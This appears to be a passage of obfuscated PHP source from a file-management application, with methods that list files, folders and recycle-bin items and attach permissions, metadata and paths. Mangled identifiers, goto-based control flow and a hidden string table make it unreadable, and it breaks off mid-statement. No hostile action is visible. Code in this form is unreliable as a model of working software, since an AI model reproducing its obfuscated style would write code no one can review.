CËÑï‰³Ù³: foreach ($A•ù»ïšì as $cÁê­ŠŠ¢­ => $Dê˜è­Ú±¥) { $b‡˜¨é¼« = !0; if (!$b®òø¬Âˆ«) { $båµØ‰Ûƒ[] = $cÁê­ŠŠ¢­; continue; } foreach ($b®òø¬Âˆ« as $aÕÓÂ„ø‡ö) { if (!in_array($aÕÓÂ„ø‡ö, $Dê˜è­Ú±¥)) { $b‡˜¨é¼« = !1; break; } } if ($b‡˜¨é¼«) { $båµØ‰Ûƒ[] = $cÁê­ŠŠ¢­; } } if (!$båµØ‰Ûƒ) { return array(); } $cÕé²ÔÊˆ = $this->listSource(array($Aƒß¼‡ÛÛ‘[404] => array($Aƒß¼‡ÛÛ‘[405], $båµØ‰Ûƒ))); goto BÑ›‹ˆ¦ ; f­Ûá›¸Î: $f·íŸ÷ª£ß = array_to_keyvalue($cÕé²ÔÊˆ[$Aƒß¼‡ÛÛ‘[73]], $Aƒß¼‡ÛÛ‘[33], $Aƒß¼‡ÛÛ‘[390]); $E«’›ªÔ = array_merge($f·íŸ÷ª£ß, $D«œ¸¨ê‡–); foreach ($båµØ‰Ûƒ as $eÖâùô’í±) { if (!in_array($eÖâùô’í±, $E«’›ªÔ)) { $E°Ü½Ğåã¸[] = $eÖâùô’í±; } } goto E„²ˆ¾É‡š; c“•ñëÖä: $Aƒß¼‡ÛÛ‘ =& $_SERVER[ÉóçÄÇ]; if ($b®òø¬Âˆ« && !is_array($b®òø¬Âˆ«)) { $b®òø¬Âˆ« = array($b®òø¬Âˆ«); } $BÚÄ³¶½Ë† = Model($Aƒß¼‡ÛÛ‘[412])->listData(); goto aíôĞ“¾‹; CøæÇ•ø‡ì: } public function listUserRecycle() { $dÂ‰êÂ¨šŒ =& $_SERVER[ÉóçÄÇ]; $d¶ƒÑİÄ‡ = Model($dÂ‰êÂ¨šŒ[415])->listData(); if (!$d¶ƒÑİÄ‡) { return array(); } $Bñ“ŒÃğÖæ = array($dÂ‰êÂ¨šŒ[404] => array($dÂ‰êÂ¨šŒ[405], $d¶ƒÑİÄ‡), $dÂ‰êÂ¨šŒ[416] => 1); return $this->listSource($Bñ“ŒÃğÖæ); } public function listSource($Aƒ„è§Ó», $AŒõô¸­¨ö = 3000) { goto c¤Ûğôîß¦; cÄîêÁÖò’: return $A¼ñ—¦ï; goto EŠ»‹ºº­; c¤Ûğôîß¦: $b˜à‹£¡§Ö =& $_SERVER[ÉóçÄÇ]; if (!isset($Aƒ„è§Ó»[$b˜à‹£¡§Ö[417]])) { $Aƒ„è§Ó»[$b˜à‹£¡§Ö[417]] = 0; } $bÓù˜†‘²¿ = $b˜à‹£¡§Ö[418]; goto Báä¯îÚìô; Báä¯îÚìô: $A¼ñ—¦ï = $this->field($bÓù˜†‘²¿)->_makeOrder()->where($Aƒ„è§Ó»)->selectPage($AŒõô¸­¨ö); $this->_listDataApply($A¼ñ—¦ï[$b˜à‹£¡§Ö[365]]); $this->_listMake($A¼ñ—¦ï); goto cÄîêÁÖò’; EŠ»‹ºº­: } protected function _makeOrder() { goto b†®¹ôò’; EåäãïëË: $aÔùšœ‚ô = array($A‡ƒìÄ´—[422] => $A‡ƒìÄ´—[423], $A‡ƒìÄ´—[424] => $A‡ƒìÄ´—[425]); $AšÙŠ«’·¤ = array($A‡ƒìÄ´—[28] => $A‡ƒìÄ´—[28], $A‡ƒìÄ´—[77] => $A‡ƒìÄ´—[77], $A‡ƒìÄ´—[167] => $A‡ƒìÄ´—[399], $A‡ƒìÄ´—[426] => $A‡ƒìÄ´—[426], $A‡ƒìÄ´—[427] => $A‡ƒìÄ´—[428], $A‡ƒìÄ´—[192] => $A‡ƒìÄ´—[192], $A‡ƒìÄ´—[83] => $A‡ƒìÄ´—[83]); $aŒ„³‰Š¯ = Input::get($A‡ƒìÄ´—[429], $A‡ƒìÄ´—[7], $FŸÌÌÆ¡ë½, array_keys($AšÙŠ«’·¤)); goto Fï’ˆ‡á¼ã; Fï’ˆ‡á¼ã: $cÖ¯´õÎàŠ = Input::get($A‡ƒìÄ´—[430], $A‡ƒìÄ´—[7], $f®¿‚õ¾, array_keys($aÔùšœ‚ô)); if (!in_array($aŒ„³‰Š¯, array_keys($AšÙŠ«’·¤))) { $aŒ„³‰Š¯ = $A‡ƒìÄ´—[28]; } if (!in_array($cÖ¯´õÎàŠ, array_keys($aÔùšœ‚ô))) { $aŒ„³‰Š¯ = $A‡ƒìÄ´—[422]; } goto dª©ÃÙ¯ãñ; b†®¹ôò’: $A‡ƒìÄ´— =& $_SERVER[ÉóçÄÇ]; $FŸÌÌÆ¡ë½ = Model($A‡ƒìÄ´—[419])->get($A‡ƒìÄ´—[420]); $f®¿‚õ¾ = Model($A‡ƒìÄ´—[419])->get($A‡ƒìÄ´—[421]); goto EåäãïëË; dª©ÃÙ¯ãñ: if ($aŒ„³‰Š¯ == $A‡ƒìÄ´—[28]) { } $DÚ¶¥ŞŞ = $A‡ƒìÄ´—[431] . $AšÙŠ«’·¤[$aŒ„³‰Š¯] . $A‡ƒìÄ´—[50] . $aÔùšœ‚ô[$cÖ¯´õÎàŠ]; return $this->order(rtrim(trim($DÚ¶¥ŞŞ), $A‡ƒìÄ´—[47])); goto Bì‹İôö¨¸; Bì‹İôö¨¸: } protected function _listDataApplyItem($bÖ®¸ùÓ„É, $D¬«„ƒø¡ = false) { $EÏƒ¥Àë¤¢ = array($bÖ®¸ùÓ„É); $this->_listDataApply($EÏƒ¥Àë¤¢, $D¬«„ƒø¡); return $EÏƒ¥Àë¤¢[0]; } protected function _listDataApply(&$b³³÷ò»ãÜ, $aíìßÌŒÁ† = false) { goto C‰õ¶îğÉ†; f‚©ø¹“ñµ: $this->_listAppendPath($b³³÷ò»ãÜ); $this->_listAppendAuth($b³³÷ò»ãÜ); $this->_listAppendSourceInfo($b³³÷ò»ãÜ, $f„†³¤²ô‚); goto FÕŸ‰ËÉ¥; C‰õ¶îğÉ†: $b˜äÍ‰Ñì“ =& $_SERVER[ÉóçÄÇ]; if (!$b³³÷ò»ãÜ) { $b³³÷ò»ãÜ = array(); return; } $f„†³¤²ô‚ = array_to_keyvalue($b³³÷ò»ãÜ, $b˜äÍ‰Ñì“[33], $b˜äÍ‰Ñì“[390]); goto eÆÛ‘¥‘ç; FÕŸ‰ËÉ¥: $this->_listAppendUser($b³³÷ò»ãÜ); $this->_listFilterInfo($b³³÷ò»ãÜ, $aíìßÌŒÁ†); goto Bø¿÷²ĞÇ‰; eÆÛ‘¥‘ç: $f„†³¤²ô‚ = array_unique($f„†³¤²ô‚); $this->_listSourceCache($b³³÷ò»ãÜ); if (!$aíìßÌŒÁ†) { $this->_listAppendMeta($b³³÷ò»ãÜ, $f„†³¤²ô‚); $this->_listAppendFileMeta($b³³÷ò»ãÜ, $f„†³¤²ô‚); $this->_listAppendChildren($b³³÷ò»ãÜ, $f„†³¤²ô‚); } goto f‚©ø¹“ñµ; Bø¿÷²ĞÇ‰: } protected function _listSourceCache($DçæŒÙÒ•—) { $cß™İ¸†©ñ =& $_SERVER[ÉóçÄÇ]; foreach ($DçæŒÙÒ•— as $dã¿Œ×«Íø) { self::$cacheSourceInfo[$cß™İ¸†©ñ[432] . $dã¿Œ×«Íø[$cß™İ¸†©ñ[390]]] = $dã¿Œ×«Íø; } } protected function _listFilterInfo(&$b’¹¾Şˆ§Š, $f«ç‹ŠÈ‹ˆ = false) { $e¯ËŒÜå¡ì =& $_SERVER[ÉóçÄÇ]; foreach ($b’¹¾Şˆ§Š as &$E†ç‰©´Ïô) { $E†ç‰©´Ïô = $this->pathInfoFilter($E†ç‰©´Ïô); self::$cachePathInfo[$e¯ËŒÜå¡ì[433] . intval($f«ç‹ŠÈ‹ˆ) . $e¯ËŒÜå¡ì[434] . $E†ç‰©´Ïô[$e¯ËŒÜå¡ì[390]]] = $E†ç‰©´Ïô; } unset($E†ç‰©´Ïô); } protected function _listMake(&$bÛŠ¼òÉÖà) { $A¹˜‘À­³À =& $_SERVER[ÉóçÄÇ]; $bÛŠ¼òÉÖà[$A¹˜‘À­³À[74]] = array(); $bÛŠ¼òÉÖà[$A¹˜‘À­³À[73]] = array(); foreach ($bÛŠ¼òÉÖà[$A¹˜‘À­³À[365]] as $fŞí»îƒÊ‘) { $cê½Ú¾¯äÖ = $fŞí»îƒÊ‘[$A¹˜‘À­³À[397]] == 1 ? $A¹˜‘À­³À[74] : $A¹˜‘À­³À[73]; $bÛŠ¼òÉÖà[$cê½Ú¾¯äÖ][] = $fŞí»îƒÊ‘; } unset($bÛŠ¼òÉÖà[$A¹˜‘À­³À[365]]); } protected function _listAppendMeta(&$cÔ‡ Îğ—œ, $C¹÷åÅÕ§Ë) { goto eöˆâß„; C¬µÄóÅÊ: if (!$Bç˜Õàâƒ–) { return; } $bØ‰ğò = array($CÜ¹¯ø‰‘é[437], $CÜ¹¯ø‰‘é[438]); $C¾ÌŸ–å­Ò = array(); goto Eˆ—‹ëÀ£†; Eˆ—‹ëÀ£†: foreach ($Bç˜Õàâƒ– as $C¶‰ÖÏÀÎ÷) { if (!isset($C¾ÌŸ–å­Ò[$C¶‰ÖÏÀÎ÷[$CÜ¹¯ø‰‘é[390]]])) { $C¾ÌŸ–å­Ò[$C¶‰ÖÏÀÎ÷[$CÜ¹¯ø‰‘é[390]]] = array(); } if (in_array($C¶‰ÖÏÀÎ÷[$CÜ¹¯ø‰‘é[92]], $bØ‰ğò)) { continue; } $C¾ÌŸ–å­Ò[$C¶‰ÖÏÀÎ÷[$CÜ¹¯ø‰‘é[390]]][$C¶‰ÖÏÀÎ÷[$CÜ¹¯ø‰‘é[92]]] = $C¶‰ÖÏÀÎ÷[$CÜ¹¯ø‰‘é[370]]; } foreach ($cÔ‡ Îğ—œ as &$BÑÑ¹·êÜ») { $BÑÑ¹·êÜ»[$CÜ¹¯ø‰‘é[439]] = !1; if (isset($C¾ÌŸ–å­Ò[$BÑÑ¹·êÜ»[$CÜ¹¯ø‰‘é[390]]])) { $BÑÑ¹·êÜ»[$CÜ¹¯ø‰‘é[439]] = $C¾ÌŸ–å­Ò[$BÑÑ¹·êÜ»[$CÜ¹¯ø‰‘é[390]]]; } if ($this->fileIsLock($BÑÑ¹·êÜ») && $BÑÑ¹·êÜ»[$CÜ¹¯ø‰‘é[400]]) { $Fƒ½Î„Ú®¥ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $BÑÑ¹·êÜ»[$CÜ¹¯ø‰‘é[400]][$CÜ¹¯ø‰‘é[401]] = AuthModel::authDisable($BÑÑ¹·êÜ»[$CÜ¹¯ø‰‘é[400]][$CÜ¹¯ø‰‘é[401]], $Fƒ½Î„Ú®¥); $BÑÑ¹·êÜ»[$CÜ¹¯ø‰‘é[400]][$CÜ¹¯ø‰‘é[440]][$CÜ¹¯ø‰‘é[400]] = $BÑÑ¹·êÜ»[$CÜ¹¯ø‰‘é[400]][$CÜ¹¯ø‰‘é[401]]; } } unset($BÑÑ¹·êÜ»); goto A‰ÚğœÓÛ“; eöˆâß„: $CÜ¹¯ø‰‘é =& $_SERVER[ÉóçÄÇ]; $Dˆ³¦²‰‡Í = array($CÜ¹¯ø‰‘é[404] => array($CÜ¹¯ø‰‘é[405], $C¹÷åÅÕ§Ë)); $Bç˜Õàâƒ– = Model($CÜ¹¯ø‰‘é[435])->field($CÜ¹¯ø‰‘é[436])->where($Dˆ³¦²‰‡Í)->select(); goto C¬µÄóÅÊ; A‰ÚğœÓÛ“: } protected function _listAppendFileMeta(&$fèµö°¢è», $DŒš·£Ùä) { goto fôÛ‹ø­Üµ; FÂ¼ÒÔ§ÒÏ: $aĞ¬¢òŠ¬Ë = $aĞ¬¢òŠ¬Ë ? $aĞ¬¢òŠ¬Ë : array(); $F©š§–Ù¸İ = array(); foreach ($aĞ¬¢òŠ¬Ë as $eÉòßÛÓ) { if (!isset($F©š§–Ù¸İ[$eÉòßÛÓ[$FÔ³²†§Òî[441]]])) { $F©š§–Ù¸İ[$eÉòßÛÓ[$FÔ³²†§Òî[441]]] = array(); } $F©š§–Ù¸İ[$eÉòßÛÓ[$FÔ³²†§Òî[441]]][$eÉòßÛÓ[$FÔ³²†§Òî[92]]] = $eÉòßÛÓ[$FÔ³²†§Òî[370]]; } goto dŠ©Ã±Ğ‚; fôÛ‹ø­Üµ: $FÔ³²†§Òî =& $_SERVER[ÉóçÄÇ]; $b›å‹¢Íœ = array_to_keyvalue($fèµö°¢è», $FÔ³²†§Òî[33], $FÔ³²†§Òî[441]); $b›å‹¢Íœ = array_filter(array_unique($b›å‹¢Íœ)); goto DºíëÃ–§; F†½å¥Öµ: $Dõí¸Ş‹±À = Model($FÔ³²†§Òî[444])->field($B•éæÖÒ£)->where($f’ÄªÊ®œƒ)->select(); $Dõí¸Ş‹±À = array_to_keyvalue($Dõí¸Ş‹±À, $FÔ³²†§Òî[441]); $aĞ¬¢òŠ¬Ë = Model($FÔ³²†§Òî[445])->field($FÔ³²†§Òî[446])->where($f’ÄªÊ®œƒ)->select(); goto FÂ¼ÒÔ§ÒÏ; DºíëÃ–§: if (!$b›å‹¢Íœ) { return; } $f’ÄªÊ®œƒ = array($FÔ³²†§Òî[442] => array($FÔ³²†§Òî[405], $b›å‹¢Íœ)); $B•éæÖÒ£ = $FÔ³²†§Òî[443]; goto F†½å¥Öµ; dŠ©Ã±Ğ‚: foreach ($fèµö°¢è» as &$A¼åòõŒ) { goto dÕØî÷Óœ; F¦‹Î™’×: unset($Dõí¸Ş‹±À[$bšÃÇ‡÷¢Ğ][$FÔ³²†§Òî[75]]); $e‰ÌÏçè­‡ = is_array($F©š§–Ù¸İ[$bšÃÇ‡÷¢Ğ]) ? $F©š§–Ù¸İ[$bšÃÇ‡÷¢Ğ] : array(); $A¼åòõŒ[$FÔ³²†§Òî[163]] = array_merge($e‰ÌÏçè­‡, $Dõí¸Ş‹±À[$bšÃÇ‡÷¢Ğ]); goto AË“œ›àØ—; AË“œ›àØ—: if (isset($A¼åòõŒ[$FÔ³²†§Òî[163]][$FÔ³²†§Òî[162]])) { $A¼åòõŒ[$FÔ³²†§Òî[162]] = json_decode($A¼åòõŒ[$FÔ³²†§Òî[163]][$FÔ³²†§Òî[162]], !0); unset($A¼åòõŒ[$FÔ³²†§Òî[163]][$FÔ³²†§Òî[162]]); } goto a¯Ğ¿àø±; dÕØî÷Óœ: $bšÃÇ‡÷¢Ğ = $A¼åòõŒ[$FÔ³²†§Òî[441]]; if (!$bšÃÇ‡÷¢Ğ || !isset($Dõí¸Ş‹±À[$bšÃÇ‡÷¢Ğ])) { continue; } $aÜÚÊ—»‹ã = $Dõí¸Ş‹±À[$bšÃÇ‡÷¢Ğ]; goto f Ñß‘ê±ƒ; f Ñß‘ê±ƒ: $aÜÚÊ—»‹ã[$FÔ³²†§Òî[77]] = $A¼åòõŒ[$FÔ³²†§Òî[77]]; $aÜÚÊ—»‹ã[$FÔ³²†§Òî[28]] = $A¼åòõŒ[$FÔ³²†§Òî[28]]; if (!isset(self::$cacheFileInfo[$FÔ³²†§Òî[447] . $bšÃÇ‡÷¢Ğ])) { self::$cacheFileInfo[$FÔ³²†§Òî[447] . $bšÃÇ‡÷¢Ğ] = array_merge(array(), $aÜÚÊ—»‹ã); } goto F¦‹Î™’×; a¯Ğ¿àø±: } unset($A¼åòõŒ); goto e“¹¨«­•Ê; e“¹¨«­•Ê: } protected function _listAppendSourceInfo(&$C®È¥íº¶Ó, $bÇœ³øóÉ) { goto BÂ™Ñ‚îÍŠ; A‹”¦êÍõø: $AÉœ¯×‚ô‰ = array_to_keyvalue_group($d«½ØØé©¸, $f©´•‡¸Î±[390]); foreach ($C®È¥íº¶Ó as &$eĞŞëëØ») { $eĞŞëëØ»[$f©´•‡¸Î±[84]] = array($f©´•‡¸Î±[451] => 0, $f©´•‡¸Î±[452] => 0, $f©´•‡¸Î±[453] => 0); if (isset($Fè¶­ÕÂ†[$eĞŞëëØ»[$f©´•‡¸Î±[390]]])) { $eĞŞëëØ»[$f©´•‡¸Î±[84]][$f©´•‡¸Î±[454]] = 1; $eĞŞëëØ»[$f©´•‡¸Î±[84]][$f©´•‡¸Î±[455]] = $Fè¶­ÕÂ†[$eĞŞëëØ»[$f©´•‡¸Î±[390]]][$f©´•‡¸Î±[28]]; } if (isset($Bñ¢—¢óùÀ[$eĞŞëëØ»[$f©´•‡¸Î±[390]]])) { $eĞŞëëØ»[$f©´•‡¸Î±[84]][$f©´•‡¸Î±[456]] = array(); foreach ($Bñ¢—¢óùÀ[$eĞŞëëØ»[$f©´•‡¸Î±[390]]] as $b°»êÆä¯) { $CœÏÏªÑ´à = $e†™Ó›¹Äá[$b°»êÆä¯]; $eĞŞëëØ»[$f©´•‡¸Î±[84]][$f©´•‡¸Î±[456]][] = array($f©´•‡¸Î±[457] => $CœÏÏªÑ´à[$f©´•‡¸Î±[388]], $f©´•‡¸Î±[407] => $CœÏÏªÑ´à[$f©´•‡¸Î±[28]], $f©´•‡¸Î±[458] => $CœÏÏªÑ´à[$f©´•‡¸Î±[459]]); } } if (isset($AÉœ¯×‚ô‰[$eĞŞëëØ»[$f©´•‡¸Î±[390]]])) { $eĞŞëëØ»[$f©´•‡¸Î±[84]][$f©´•‡¸Î±[460]] = array(); foreach ($AÉœ¯×‚ô‰[$eĞŞëëØ»[$f©´•‡¸Î±[390]]] as $cË°àµ¿) { $eĞŞëëØ»[$f©´•‡¸Î±[84]][$f©´•‡¸Î±[460]] = array($f©´•‡¸Î±[461] => $cË°àµ¿[$f©´•‡¸Î±[462]], $f©´•‡¸Î±[463] => $cË°àµ¿[$f©´•‡¸Î±[464]], $f©´•‡¸Î±[465] => $cË°àµ¿[$f©´•‡¸Î±[390]], $f©´•‡¸Î±[466] => $cË°àµ¿[$f©´•‡¸Î±[467]], $f©´•‡¸Î±[468] => $cË°àµ¿[$f©´•‡¸Î±[469]], $f©´•‡¸Î±[470] => $cË°àµ¿[$f©´•‡¸Î±[470]], $f©´•‡¸Î±[471] => $cË°àµ¿[$f©´•‡¸Î±[471]]); } } } unset($eĞŞëëØ»); goto EñğÜé£İì; EñğÜé£İì: return $C®È¥íº¶Ó; goto c¶ä¨è­¬÷; f°§ ƒ™Ñ: $bä¯”ÔîŒ = Model($f©´•‡¸Î±[412])->listData(); $EØÅ¯ñõ° = Model($f©´•‡¸Î±[402])->listData(); $d«½ØØé©¸ = Model($f©´•‡¸Î±[450])->listSimple(); goto bİ„Ûˆİ—¹; bİ„Ûˆİ—¹: $e†™Ó›¹Äá = array_to_keyvalue($b ˆñÉ§èù, $f©´•‡¸Î±[388]); $Bñ¢—¢óùÀ = array_to_keyvalue_group($bä¯”ÔîŒ, $f©´•‡¸Î±[75], $f©´•‡¸Î±[413]); $Fè¶­ÕÂ† = array_to_keyvalue($EØÅ¯ñõ°, $f©´•‡¸Î±[75]); goto A‹”¦êÍõø; BÂ™Ñ‚îÍŠ: $f©´•‡¸Î± =& $_SERVER[ÉóçÄÇ]; if (!defined($f©´•‡¸Î±[448])) { return; } $b ˆñÉ§èù = Model($f©´•‡¸Î±[449])->listData(); goto f°§ ƒ™Ñ; c¶ä¨è­¬÷: } protected function _listAppendChildren(&$d²î¯‹—§, $c¦Ä£Íªá) { goto DÎ«Ø½œ²; c’Ã¬ÓìÒ: $AŒ”Ï³†‰© = array(); foreach ($B†ù£îÆ¶ as $EÙ¦Ÿ¯‡) { $Dà°çÇÅÄ  = $EÙ¦Ÿ¯‡[$Bˆ’ÛË¤·Ö[472]]; $fÒ£­ÎêêÛ = $EÙ¦Ÿ¯‡[$Bˆ’ÛË¤·Ö[397]] == $Bˆ’ÛË¤·Ö[86] ? $Bˆ’ÛË¤·Ö[202] : $Bˆ’ÛË¤·Ö[201]; if (!isset($AŒ”Ï³†‰©[$Dà°çÇÅÄ ])) { $AŒ”Ï³†‰©[$Dà°çÇÅÄ ] = array($Bˆ’ÛË¤·Ö[201] => 0, $Bˆ’ÛË¤·Ö[202] => 0); } $AŒ”Ï³†‰©[$Dà°çÇÅÄ ][$fÒ£­ÎêêÛ] += $EÙ¦Ÿ¯‡[$Bˆ’ÛË¤·Ö[474]]; } foreach ($d²î¯‹—§ as &$BøñÌÑ æ) { if (!$BøñÌÑ æ[$Bˆ’ÛË¤·Ö[397]]) { continue; } $aõê‹æ¼õ = is_array($AŒ”Ï³†‰©[$BøñÌÑ æ[$Bˆ’ÛË¤·Ö[390]]]) ? $AŒ”Ï³†‰©[$BøñÌÑ æ[$Bˆ’ÛË¤·Ö[390]]] : $cãö÷òä¥¿; $BøñÌÑ æ[$Bˆ’ÛË¤·Ö[202]] = $aõê‹æ¼õ[$Bˆ’ÛË¤·Ö[202]]; $BøñÌÑ æ[$Bˆ’ÛË¤·Ö[201]] = $aõê‹æ¼õ[$Bˆ’ÛË¤·Ö[201]]; unset($BøñÌÑ æ[$Bˆ’ÛË¤·Ö[399]]); } goto FŠ†¦ÖÕËí; D×Îù¬¬É: $DŒ¡–ÁË« = array($Bˆ’ÛË¤·Ö[472] => array($Bˆ’ÛË¤·Ö[7], $b¿âØŠÈÙ)); $d¿´’âö±Í = array($Bˆ’ÛË¤·Ö[472], $Bˆ’ÛË¤·Ö[397], $Bˆ’ÛË¤·Ö[473] => $Bˆ’ÛË¤·Ö[474]); $B†ù£îÆ¶ = $this->field($d¿´’âö±Í)->where($DŒ¡–ÁË«)->group($Bˆ’ÛË¤·Ö[475])->select(); goto c’Ã¬ÓìÒ; FŠ†¦ÖÕËí: unset($BøñÌÑ æ); goto a¶¹İ‚ª…; DÎ«Ø½œ²: $Bˆ’ÛË¤·Ö =& $_SERVER[ÉóçÄÇ]; $b¿âØŠÈÙ = array(); $cãö÷òä¥¿ = array($Bˆ’ÛË¤·Ö[201] => 0, $Bˆ’ÛË¤·Ö[202] => 0); goto dé—ğùÂ‚; dé—ğùÂ‚: foreach ($d²î¯‹—§ as &$BøñÌÑ æ) { if (!$BøñÌÑ æ[$Bˆ’ÛË¤·Ö[397]]) { continue; } $b¿âØŠÈÙ[] = $BøñÌÑ æ[$Bˆ’ÛË¤·Ö[390]]; } unset($BøñÌÑ æ); if (!$b¿âØŠÈÙ) { return; } goto D×Îù¬¬É; a¶¹İ‚ª…: } protected function _listAppendAuth(&$e’»İÄ˜Á) { goto c£—Œë®·¯; cÌ‡¡’¹°: $e–àÌİÃ¬± = Model($e”ÏÅÏ§[476])->getSourceList($a„„òöÕãÊ, $c‡¾¡¬Ìñ); foreach ($e’»İÄ˜Á as $Aõ„ÁÃÚˆ => &$C±À¹¦¿æÑ) { $C±À¹¦¿æÑ[$e”ÏÅÏ§[400]] = $e–àÌİÃ¬±[$C±À¹¦¿æÑ[$e”ÏÅÏ§[390]]]; if (!$C±À¹¦¿æÑ[$e”ÏÅÏ§[400]] && $C±À¹¦¿æÑ[$e”ÏÅÏ§[398]] == self::TYPE_GROUP) { $C±À¹¦¿æÑ[$e”ÏÅÏ§[400]] = Action($e”ÏÅÏ§[477])->pathGroupAuthMake($C±À¹¦¿æÑ[$e”ÏÅÏ§[478]]); if (!$C±À¹¦¿æÑ[$e”ÏÅÏ§[400]] && !_get($GLOBALS, $e”ÏÅÏ§[479])) { $C±À¹¦¿æÑ[$e”ÏÅÏ§[194]] = !1; $C±À¹¦¿æÑ[$e”ÏÅÏ§[193]] = !1; } } if ($C±À¹¦¿æÑ[$e”ÏÅÏ§[400]]) { $C±À¹¦¿æÑ[$e”ÏÅÏ§[194]] = AuthModel::authCheckEdit($C±À¹¦¿æÑ[$e”ÏÅÏ§[400]][$e”ÏÅÏ§[401]]); $C±À¹¦¿æÑ[$e”ÏÅÏ§[193]] = AuthModel::authCheckView($C±À¹¦¿æÑ[$e”ÏÅÏ§[400]][$e”ÏÅÏ§[401]]); } $this->groupPathDisplay($C±À¹¦¿æÑ); } unset($C±À¹¦¿æÑ); goto DŒÖñ‘É‹±; c£—Œë®·¯: $e”ÏÅÏ§ =& $_SERVER[ÉóçÄÇ]; if (!defined($e”ÏÅÏ§[448])) { return; } $a„„òöÕãÊ = array(); goto a±·Ş·ò; a±·Ş·ò: foreach ($e’»İÄ˜Á as $C±À¹¦¿æÑ) { if ($C±À¹¦¿æÑ[$e”ÏÅÏ§[398]] == self::TYPE_GROUP) { $a„„òöÕãÊ[] = $C±À¹¦¿æÑ[$e”ÏÅÏ§[390]]; } } if (!$a„„òöÕãÊ) { return; } $c‡¾¡¬Ìñ = array_to_keyvalue($e’»İÄ˜Á, $e”ÏÅÏ§[390]); goto cÌ‡¡’¹°; DŒÖñ‘É‹±: } public function groupPathDisplay(&$FõÃ™øƒ‹) { goto EÛÉšóœ±†; aëªŠğøéã: $aŒ‰Šò©¸˜ = $this->parentLevelArray($Aáùï¶ Ä¸[$cãä•¯×ğ£[481]]); $Bô‹êÅ•ŸÒ = $cãä•¯×ğ£[33]; foreach ($aŒ‰Šò©¸˜ as $f°´Şó¾·“) { $b“…ÊÅ¤¨Š = Model($cãä•¯×ğ£[480])->getInfo($f°´Şó¾·“); $Bô‹êÅ•ŸÒ .= $b“…ÊÅ¤¨Š[$cãä•¯×ğ£[84]][$cãä•¯×ğ£[390]] . $cãä•¯×ğ£[47]; } goto FæóØµ¾‡‡; FæóØµ¾‡‡: $FõÃ™øƒ‹[$cãä•¯×ğ£[482]] = $Aáùï¶ Ä¸[$cãä•¯×ğ£[472]]; $FõÃ™øƒ‹[$cãä•¯×ğ£[483]] = $Aáùï¶ Ä¸[$cãä•¯×ğ£[481]]; $FõÃ™øƒ‹[$cãä•¯×ğ£[484]] = $Aáùï¶ Ä¸[$cãä•¯×ğ£[485]]; goto aœÆÇá¹š£; EÛÉšóœ±†: $cãä•¯×ğ£ =& $_SERVER[ÉóçÄÇ]; if ($FõÃ™øƒ‹[$cãä•¯×ğ£[398]] != self::TYPE_GROUP) { return; } $Aáùï¶ Ä¸ = Model($cãä•¯×ğ£[480])->getInfo($FõÃ™øƒ‹[$cãä•¯×ğ£[478]]); goto aëªŠğøéã; aœÆÇá¹š£: $FõÃ™øƒ‹[$cãä•¯×ğ£[486]] = $Bô‹êÅ•ŸÒ . $Aáùï¶ Ä¸[$cãä•¯×ğ£[84]][$cãä•¯×ğ£[390]]; goto A™Ô¹ƒ¢›”; A™Ô¹ƒ¢›”: } protected function _listAppendPath(&$c½šÏŒÒÇ) { goto B¹ìËÚìÇî; B¹ìËÚìÇî: $B©‡ÂùÜ¼ =& $_SERVER[ÉóçÄÇ]; static $bœ“ğÚßÃò = array(); $Eµê½Ç°Î£ = array(); goto C¨¶õ“Õ®©; føò§‡Å‹´: $D¥Çİ–ãäö = array(); $dñá´øãÁ = array(); foreach ($c½šÏŒÒÇ as &$bÏ…ñÄÍÊÆ) { goto bñ¼›¹ª¡; FÚåèå±Ö£: $bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[489]] = str_replace($B©‡ÂùÜ¼[490], $B©‡ÂùÜ¼[8], $aõãÂÖİó); $C®óğ‰ÛÇñ = trim($bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[489]], $B©‡ÂùÜ¼[8]); if ($bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[472]] == $B©‡ÂùÜ¼[491] && $C®óğ‰ÛÇñ) { $bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[28]] = $C®óğ‰ÛÇñ; } goto C…ÄÍ‡»Ä; bñ¼›¹ª¡: $A¥×™óêğ¿ = $bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[481]]; if (isset($dñá´øãÁ[$A¥×™óêğ¿])) { $aõãÂÖİó = $D¥Çİ–ãäö[$A¥×™óêğ¿]; } else { $c¼”ÁËÃÈ = $this->parentLevelArray($bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[481]]); $b¾À´£§¤ = $B©‡ÂùÜ¼[488] . $bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[398]] . $B©‡ÂùÜ¼[434] . $bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[478]]; if ($D¥Çİ–ãäö[$b¾À´£§¤]) { $aõãÂÖİó = $D¥Çİ–ãäö[$b¾À´£§¤]; } else { $aõãÂÖİó = $this->_listAppendPathRoot($bÏ…ñÄÍÊÆ, $c¼”ÁËÃÈ); $D¥Çİ–ãäö[$b¾À´£§¤] = $aõãÂÖİó; } foreach ($c¼”ÁËÃÈ as $EÛˆøÜÊ¦ => $f•Ú¶É•³) { if ($EÛˆøÜÊ¦ == 0 && $aõãÂÖİó && $bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[398]] == self::TYPE_GROUP) { continue; } if (isset($bœ“ğÚßÃò[$f•Ú¶É•³])) { $aõãÂÖİó .= $bœ“ğÚßÃò[$f•Ú¶É•³] . $B©‡ÂùÜ¼[8]; } } if ($c¼”ÁËÃÈ) { $aõãÂÖİó .= $bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[28]]; } $D¥Çİ–ãäö[$A¥×™óêğ¿] = $aõãÂÖİó; } if ($bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[397]]) { $aõãÂÖİó .= $B©‡ÂùÜ¼[8]; } goto FÚåèå±Ö£; C…ÄÍ‡»Ä: if (intval($bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[398]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($bÏ…ñÄÍÊÆ, $c¼”ÁËÃÈ, $F†ñ¶É…â®); } goto c×–ÃÜöÒ•; c×–ÃÜöÒ•: } goto A•ËŸîÜŒ»; C¨¶õ“Õ®©: $Dğ’‚÷ÈÉå = array(); foreach ($c½šÏŒÒÇ as &$bÏ…ñÄÍÊÆ) { $b÷§ä†¢©¨ = 